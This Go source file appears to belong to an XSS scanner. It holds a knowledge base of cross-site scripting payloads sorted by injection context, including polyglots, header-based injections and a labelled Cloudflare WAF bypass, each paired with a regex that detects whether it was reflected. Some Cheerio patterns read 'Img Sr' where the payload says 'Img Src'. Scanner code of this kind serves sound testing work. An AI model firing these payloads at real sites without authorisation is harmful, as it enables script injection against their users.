// Package payloads holds the built-in multi-context XSS payload knowledge base.
package payloads

import (
	"regexp"
)

// PayloadData describes a single XSS payload with its verification signatures.
type PayloadData struct {
	Key            string
	Name           string
	Payload        string
	RegexPattern   string
	CheerioPattern string
	Regex          *regexp.Regexp
	CheerioRegex   *regexp.Regexp
	DialogType     string
	ExpectedValue  int
	CheckForMatch  int
}

type category struct {
	name     string
	payloads []*PayloadData
}

func newPayload(key, name, payload, regex, cheerio, dialogType string, expected, checkForMatch int) *PayloadData {
	return &PayloadData{
		Key: key, Name: name, Payload: payload,
		RegexPattern:   regex,
		CheerioPattern: cheerio,
		Regex:          mustCompile(regex),
		CheerioRegex:   mustCompile(cheerio),
		DialogType:     dialogType, ExpectedValue: expected, CheckForMatch: checkForMatch,
	}
}

func mustCompile(pattern string) *regexp.Regexp {
	return regexp.MustCompile("(?i)" + pattern)
}

var payloadCategories = []category{
	{
		name: "html",
		payloads: []*PayloadData{
			newPayload(
				"htmlBasicIMGSDQuote", "HTML Basic IMG Tag (Single + Double Quote)",
				"\"'><Img/Src/Onerror=alert`9`>",
				`^\"'><Img/Src/Onerror=alert`+"`9`"+`>$`,
				`^\"'><Img/Src/Onerror=alert`+"`9`"+`>$`,
				"alert", 9, 1,
			),
			newPayload(
				"htmlBasicSVGSDQuote", "HTML Basic SVG Tag (Single + Double Quote)",
				"\"'><Svg/Onload=alert`10`>",
				`^\"'><Svg/Onload=alert`+"`10`"+`>$`,
				`^\"'><Svg/Onload=alert`+"`10`"+`>$`,
				"alert", 10, 1,
			),
			newPayload(
				"htmlBasicSVGLessThan", "HTML SVG Injection via Less-Than",
				"><Svg/Onload=(alert)(60)>",
				`^><Svg/Onload=\(alert\)\(60\)>$`,
				`^><Svg/Onload=\(alert\)\(60\)>$`,
				"alert", 60, 1,
			),
			newPayload(
				"htmlBasicIMGLessThan", "HTML IMG Injection via Less-Than",
				"><Img/Src/Onerror=alert(4)>",
				`^><Img/Src/Onerror=alert\(4\)>$`,
				`^><Img/Src/Onerror=alert\(4\)>$`,
				"alert", 4, 1,
			),
			newPayload(
				"htmlScriptTag", "HTML Script Tag Injection",
				"<Script/X>confirm(0)</Script/X>",
				`^<Script/X>confirm\(0\)</Script/X>$`,
				`^<Script/X>confirm\(0\)</Script/X>$`,
				"confirm", 0, 1,
			),
		},
	},
	{
		name: "attribute",
		payloads: []*PayloadData{
			newPayload(
				"htmlAttrInputDQuote", "HTML Attribute Injection (Double Quote)",
				"\" AutoFocus OnFoCuS=(confirm)(8) ",
				`\(confirm\)\(8\)`, `\(confirm\)\(8\)`,
				"confirm", 8, 0,
			),
			newPayload(
				"htmlAttrInputSQuote", "HTML Attribute Injection (Single Quote)",
				"' AutoFocus OnFoCuS=(confirm)(2) ",
				`\(confirm\)\(2\)`, `\(confirm\)\(2\)`,
				"confirm", 2, 0,
			),
			newPayload(
				"htmlAttrInputSpaces", "HTML Attribute Injection (Space / Slash)",
				"/ AutoFocus OnFoCuS=(confirm)(5) ",
				`\(confirm\)\(5\)`, `\(confirm\)\(5\)`,
				"confirm", 5, 0,
			),
			newPayload(
				"htmlAttrInputMedia", "HTML Attribute Media",
				"\"'/ OnError=(confirm)(36) ",
				`\(confirm\)\(36\)`, `\(confirm\)\(36\)`,
				"confirm", 36, 0,
			),
		},
	},
	{
		name: "javascript",
		payloads: []*PayloadData{
			newPayload(
				"jsDQuoteInjection", "JavaScript Injection (Double Quote)",
				"\"-alert(9)-\"",
				`^\"-alert\(9\)-\"$`, `^\"-alert\(9\)-\"$`,
				"alert", 9, 0,
			),
			newPayload(
				"jsSQuoteInjection", "JavaScript Injection (Single Quote)",
				"'-alert(42)-'",
				`^'-alert\(42\)-'$`, `^'-alert\(42\)-'$`,
				"alert", 42, 0,
			),
			newPayload(
				"jsDQuoteBSInjection", "JavaScript Injection (Escaped Double Quote)",
				"\\\"-alert(5)//",
				`^\\?\"-alert\(5\)//$`, `^\\?\"-alert\(5\)//$`,
				"alert", 5, 0,
			),
			newPayload(
				"jsSQuoteBSInjection", "JavaScript Injection (Escaped Single Quote)",
				"\\'-alert(71)//",
				`^\\?'-alert\(71\)//$`, `^\\?'-alert\(71\)//$`,
				"alert", 71, 0,
			),
			newPayload(
				"jsExpressionInterpolation", "JavaScript Template Literal Injection",
				"${(alert)(10)}",
				`^\$\{\(alert\)\(10\)\}$`, `^\$\{\(alert\)\(10\)\}$`,
				"alert", 10, 0,
			),
			newPayload(
				"jsAlert", "Direct JavaScript Execution",
				"alert(66)",
				`^alert\(66\)$`, `^alert\(66\)$`,
				"alert", 66, 0,
			),
			newPayload(
				"jsDQuoteInjectionCloudFlareByp", "JavaScript Injection (Cloudflare WAF Bypass)",
				"\"- (alert)/**/(13)-\"",
				`^\"-\(alert\)/[*]{2}/\(13\)-\"$`, `^\"-\(alert\)/[*]{2}/\(13\)-\"$`,
				"alert", 13, 0,
			),
		},
	},
	{
		name: "url",
		payloads: []*PayloadData{
			newPayload(
				"htmlJSAnchor", "JavaScript URI Injection (Anchor)",
				"javascript:alert(21)",
				`^javascript:alert\(21\)$`, `^javascript:alert\(21\)$`,
				"alert", 21, 0,
			),
			newPayload(
				"htmlJSAnchorURLs", "JavaScript URI Obfuscation (Protocol Abuse)",
				"JaVaScRiPt://%0aalert(64)",
				`^JaVaScRiPt://%0aalert\(64\)$`, `^JaVaScRiPt://%0aalert\(64\)$`,
				"alert", 64, 0,
			),
		},
	},
	{
		name: "polyglot",
		payloads: []*PayloadData{
			newPayload(
				"Polyglot1", "XSS Polyglot Payload #1",
				"<\"/*'/*></Title/</Script/--><svg/**/; OnlOad=(alert)(12)//>",
				`^<\"/\*'/\*></Title/</Script/--><svg/\*\*/; OnlOad=\(alert\)\(12\)//>$`,
				`^<\"/\*'/\*></Title/</Script/--><svg/\*\*/; OnlOad=\(alert\)\(12\)//>$`,
				"alert", 12, 1,
			),
			newPayload(
				"Polyglot2", "XSS Polyglot Payload #2",
				"\"><'<Img/Src/Onerror=(alert)(88)>",
				`^\"><'<Img/Src/Onerror=\(alert\)\(88\)>$`,
				`^\"><'<Img/Src/Onerror=\(alert\)\(88\)>$`,
				"alert", 88, 1,
			),
			newPayload(
				"Polyglot3", "XSS Polyglot Payload #3",
				"';alert(0);//--><img src=x onerror=alert(0)>\"",
				`^';alert\(0\);//--><img src=x onerror=alert\(0\)>\"$`,
				`^';alert\(0\);//--><img src=x onerror=alert\(0\)>\"$`,
				"alert", 0, 1,
			),
			newPayload(
				"Polyglot4", "XSS Polyglot Payload #4",
				"</Textarea/NoScriPt/NoEmbEd/</StyLe/><svg onload=alert(2)>",
				`^</Textarea/NoScriPt/NoEmbEd/</StyLe/><svg onload=alert\(2\)>$`,
				`^</Textarea/NoScriPt/NoEmbEd/</StyLe/><svg onload=alert\(2\)>$`,
				"alert", 2, 1,
			),
			newPayload(
				"Polyglot5Mail", "XSS Polyglot (Email Context)",
				"\"'><Svg/Onload=(alert)(9)>\"@x.com",
				`^\"'><Svg/Onload=\(alert\)\(9\)>\"@x\.com$`,
				`^\"'><Svg/Onload=\(alert\)\(9\)>\"@x\.com$`,
				"alert", 9, 1,
			),
		},
	},
	{
		name: "path_based",
		payloads: []*PayloadData{
			newPayload(
				"pathBasedIMGTag", "Path-based IMG Tag (Single + Double Quote)",
				"\"'><Img Src Onerror=alert`7`>",
				"^\\\"'><Img Src Onerror=alert`7`>$",
				"^\\\"'><Img Sr Onerror=alert`7`>$",
				"alert", 7, 1,
			),
		},
	},
	{
		name: "header_based",
		payloads: []*PayloadData{
			newPayload(
				"headerBasedUserAgentIMGTag", "[Header-based] User-Agent IMG Tag (Single + Double Quote)",
				"Mozilla/5.0\"'><Img Src Onerror=alert`0`>",
				"^Mozilla/5.0\\\"'><Img Src Onerror=alert`0`>$",
				"^Mozilla/5.0\\\"'><Img Sr Onerror=alert`0`>$",
				"alert", 0, 1,
			),
			newPayload(
				"headerBasedCookieIMGTag", "[Header-based] Cookie IMG Tag (Single + Double Quote)",
				"lang=\"'><Img Src Onerror=alert`12`>",
				"^lang=\\\"'><Img Src Onerror=alert`12`>$",
				"^lang=\\\"'><Img Sr Onerror=alert`12`>$",
				"alert", 12, 1,
			),
			newPayload(
				"headerBasedHostIMGTag", "[Header-based] Host IMG Tag (Single + Double Quote)",
				"http://0/\"'><Img Src Onerror=alert`6`>",
				"^http://0/\\\"'><Img Src Onerror=alert`6`>$",
				"^http://0/\\\"'><Img Sr Onerror=alert`6`>$",
				"alert", 6, 1,
			),
			newPayload(
				"headerBasedHostScriptTag", "[Header-based] Host Script Tag Injection",
				"1.2.3.4/<Script/X>confirm(0)</Script/X>",
				`^1\.2\.3\.4/<Script/X>confirm\(0\)</Script/X>$`,
				`^1\.2\.3\.4/<Script/X>confirm\(0\)</Script/X>$`,
				"confirm", 0, 1,
			),
			newPayload(
				"headerBasedIMGLessThan", "[Header-based] HTML IMG Injection via Less-Than",
				"0.0.0.0,><Img/Src/Onerror=alert(4)>",
				`^0\.0\.0\.0,><Img/Src/Onerror=alert\(4\)>$`,
				`^0\.0\.0\.0,><Img/Src/Onerror=alert\(4\)>$`,
				"alert", 4, 1,
			),
		},
	},
}

// PolyglotKeys lists polyglot payload keys in order.
var PolyglotKeys = []string{"Polyglot1", "Polyglot2", "Polyglot3", "Polyglot4", "Polyglot5Mail"}

// ContextMap lists, per injection context, the payload keys to test in order.
var ContextMap = map[string][]string{
	"html": {
		"htmlBasicIMGSDQuote", "htmlBasicSVGSDQuote", "htmlBasicSVGLessThan", "htmlBasicIMGLessThan",
		"htmlScriptTag", "Polyglot1", "Polyglot2", "Polyglot3", "Polyglot4", "Polyglot5Mail",
	},
	"attribute": {
		"htmlAttrInputDQuote", "htmlAttrInputSQuote", "htmlAttrInputSpaces", "htmlAttrInputMedia",
		"htmlBasicIMGSDQuote", "htmlBasicSVGSDQuote", "htmlBasicSVGLessThan", "htmlBasicIMGLessThan",
		"htmlJSAnchor", "htmlJSAnchorURLs", "Polyglot1", "Polyglot2", "Polyglot3", "Polyglot4", "Polyglot5Mail",
	},
	"javascript": {
		"jsDQuoteInjection", "jsSQuoteInjection", "jsDQuoteBSInjection", "jsSQuoteBSInjection",
		"jsExpressionInterpolation", "jsAlert", "jsDQuoteInjectionCloudFlareByp",
		"htmlBasicIMGSDQuote", "htmlBasicSVGSDQuote", "htmlJSAnchor", "htmlJSAnchorURLs",
		"Polyglot1", "Polyglot2", "Polyglot3", "Polyglot4", "Polyglot5Mail",
	},
	"url": {
		"htmlJSAnchor", "htmlJSAnchorURLs", "htmlBasicIMGSDQuote", "htmlBasicSVGSDQuote",
		"jsAlert", "jsExpressionInterpolation", "Polyglot1", "Polyglot2", "Polyglot3", "Polyglot4", "Polyglot5Mail",
	},
	"dom_js_html": {
		"jsDQuoteInjection", "htmlBasicIMGSDQuote", "jsSQuoteInjection", "htmlBasicSVGSDQuote",
		"jsDQuoteBSInjection", "htmlJSAnchor", "jsSQuoteBSInjection", "htmlJSAnchorURLs",
		"jsExpressionInterpolation", "jsAlert", "jsDQuoteInjectionCloudFlareByp",
		"Polyglot1", "Polyglot2", "Polyglot3", "Polyglot4", "Polyglot5Mail",
	},
	"path_based": {
		"pathBasedIMGTag", "jsDQuoteInjection", "htmlScriptTag", "jsSQuoteInjection",
		"jsAlert", "htmlJSAnchor", "Polyglot1", "Polyglot2",
	},
	"fragment_based": {
		"htmlBasicIMGSDQuote", "jsDQuoteInjection", "htmlScriptTag", "jsSQuoteInjection",
		"Polyglot1", "Polyglot2",
	},
	"header_based_basic":     {"htmlBasicIMGSDQuote"},
	"header_based_useragent": {"headerBasedUserAgentIMGTag"},
	"header_based_cookie":    {"headerBasedCookieIMGTag"},
	"header_based_host":      {"headerBasedHostIMGTag", "headerBasedHostScriptTag", "headerBasedIMGLessThan"},
	"header_based_url":       {"headerBasedHostIMGTag", "headerBasedHostScriptTag", "headerBasedIMGLessThan"},
}

var payloadIndex = func() map[string]*PayloadData {
	idx := map[string]*PayloadData{}
	for _, cat := range payloadCategories {
		for _, p := range cat.payloads {
			idx[p.Key] = p
		}
	}
	return idx
}()

// GetPayloadData returns the payload definition for a key, or nil when unknown.
func GetPayloadData(payloadKey string) *PayloadData {
	return payloadIndex[payloadKey]
}

// AllPayloads returns every declared payload in declaration order (deduplicated by payload string).
func AllPayloads() []*PayloadData {
	seen := map[string]bool{}
	var result []*PayloadData
	for _, cat := range payloadCategories {
		for _, p := range cat.payloads {
			if seen[p.Payload] {
				continue
			}
			seen[p.Payload] = true
			result = append(result, p)
		}
	}
	return result
}

// MatchPatterns returns the payload's verification regexes with anchors stripped
// (matching XSSRush's detect_match behavior).
func (p *PayloadData) MatchPatterns() []*regexp.Regexp {
	patterns := []string{
		stripAnchors(p.RegexPattern),
		stripAnchors(p.CheerioPattern),
	}
	var out []*regexp.Regexp
	for _, pat := range patterns {
		if pat == "" {
			continue
		}
		out = append(out, regexp.MustCompile("(?i)"+pat))
	}
	return out
}

func stripAnchors(pattern string) string {
	if len(pattern) > 0 && pattern[0] == '^' {
		pattern = pattern[1:]
	}
	if len(pattern) > 0 && pattern[len(pattern)-1] == '$' {
		if len(pattern) < 2 || pattern[len(pattern)-2] != '\\' {
			pattern = pattern[:len(pattern)-1]
		}
	}
	return pattern
}

// CheckForMatchEnabled reports whether a payload participates in DOM-match mode.
func (p *PayloadData) CheckForMatchEnabled() bool {
	return p.CheckForMatch == 1
}
